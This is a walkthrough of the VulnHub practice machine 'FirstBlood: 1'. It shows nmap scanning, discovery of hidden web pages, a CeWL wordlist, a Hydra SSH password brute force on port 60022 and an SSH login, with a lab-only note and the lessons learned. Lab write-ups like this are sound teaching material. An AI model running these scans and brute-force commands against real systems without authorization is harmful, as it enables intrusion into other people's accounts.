# FirstBlood: 1

- **Machine:** FirstBlood: 1
- **Download:** https://www.vulnhub.com/entry/firstblood-1,564/

![](766-1.png)

---

## Setup

- Extract the downloaded archive.
- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](766-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.219
```

![](766-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.219
```

```bash
nmap -sC -sV -A 192.168.2.219
```

---

## HTTP Enumeration

This command performs an aggressive scan and runs the `http-enum` NSE script to identify interesting web directories.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.219
```

---

# Web Enumeration

Visit the following URLs:

- http://192.168.2.219
- http://192.168.2.219/rambo.html
- http://192.168.2.219/robots.txt

![](766-4.png)

Visit the hidden directory:

- http://192.168.2.219/johnnyrambo/

![](766-5.png)

---

## Generate a Custom Wordlist

Generate a targeted wordlist from the website using **CeWL**.

```bash
cewl -w words.txt -d 1 -m 5 http://192.168.2.219/johnnyrambo/
```

Check the number of generated words.

```bash
wc -l words.txt
```

Display the generated wordlist.

```bash
cat words.txt
```

---

## Discover the SSH Page

Visit:

```text
http://192.168.2.219/johnnyrambo/ssh.html
```

![](766-6.png)

The page reveals that the SSH username is:

```text
johnny
```

---

# SSH Password Brute Force (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

Use Hydra with the custom wordlist to identify the SSH password.

```bash
hydra -l johnny -P words.txt -v ssh://192.168.2.219 -s 60022 -t 4
```

![](766-7.png)

Hydra successfully identifies the valid SSH password.

---

# SSH Access

Connect to the SSH service running on port **60022**.

```bash
ssh johnny@192.168.2.219 -p 60022
```

![](766-8.png)

Successful authentication provides shell access to the target system.

---

# Impact

- Hidden web content disclosed valuable information.
- A custom wordlist significantly reduced the password search space.
- Weak SSH credentials allowed unauthorized access.
- Initial shell access was obtained through SSH authentication.

---

# Key Learning

- Always enumerate hidden directories and pages.
- CeWL is useful for generating targeted password wordlists.
- Custom wordlists are often more effective than generic dictionaries.
- Non-standard SSH ports should always be tested during enumeration.
- Weak passwords can lead directly to initial system compromise.

---

# Summary

The assessment began with web enumeration, which revealed hidden pages containing useful information. A custom password wordlist was generated using CeWL, and the SSH username was identified from the website. Hydra successfully recovered the SSH password on the non-standard port **60022**, allowing authentication and initial access to the target system.